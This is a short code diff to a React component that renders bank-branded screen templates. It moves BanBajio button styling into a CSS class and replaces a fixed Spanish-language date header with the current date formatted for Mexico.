@@ -354,7 +354,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'CITIBANAMEX':
         return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'BANBAJIO':
-        return 'banbajio-button py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+        return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
       default:
         return 'bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Liverpool
     }
@@ -378,8 +378,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       {banco === 'BANBAJIO' && (
         <div className="logo text-center mb-4">
           {bankLogo()}
-          <div className="text-center bg-gray-100 text-[#4D2C91] font-bold py-2 mb-4">
-            7 de abril de 2025
+          <div className="banbajio-header mb-4">
+            {new Date().toLocaleDateString('es-MX', {
+              day: 'numeric',
+              month: 'long',
+              year: 'numeric'
+            })}
           </div>
         </div>
       )}
